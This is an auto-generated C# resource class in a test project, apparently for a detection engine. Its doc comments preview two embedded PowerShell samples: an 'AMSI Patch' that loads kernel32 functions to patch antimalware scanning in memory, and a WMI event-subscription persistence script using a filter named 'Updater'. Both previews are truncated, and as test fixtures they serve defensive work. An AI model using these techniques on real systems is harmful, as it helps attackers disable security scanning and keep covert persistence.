//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Engine.Tests {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resource1 {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resource1() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Engine.Tests.Resource1", typeof(Resource1).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Write-Host &quot;-- AMSI Patch&quot;
        ///Write-Host &quot;-- Paul Laîné (@am0nsec)&quot;
        ///Write-Host &quot;&quot;
        ///
        ///$Kernel32 = @&quot;
        ///using System;
        ///using System.Runtime.InteropServices;
        ///
        ///public class Kernel32 {
        ///    [DllImport(&quot;kernel32&quot;)]
        ///    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        ///
        ///    [DllImport(&quot;kernel32&quot;)]
        ///    public static extern IntPtr LoadLibrary(string lpLibFileName);
        ///
        ///    [DllImport(&quot;kernel32&quot;)]
        ///    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNe [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string AmsiBypass {
            get {
                return ResourceManager.GetString("AmsiBypass", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to $ElevatedTrigger = &quot;`&quot;```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```&quot;root\subscription```&quot; -Arguments @{name=&apos;Updater&apos;;EventNameSpace=&apos;root\CimV2&apos;;QueryLanguage=```&quot;WQL```&quot;;Query=```&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325```&quot;};```$Consumer=Set-WmiInstance -Namespace ```&quot;root\subscription```&quot; -Class &apos;CommandLineEventConsumer&apos; -Arguments @{  [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string PersistentWmi {
            get {
                return ResourceManager.GetString("PersistentWmi", resourceCulture);
            }
        }
    }
}
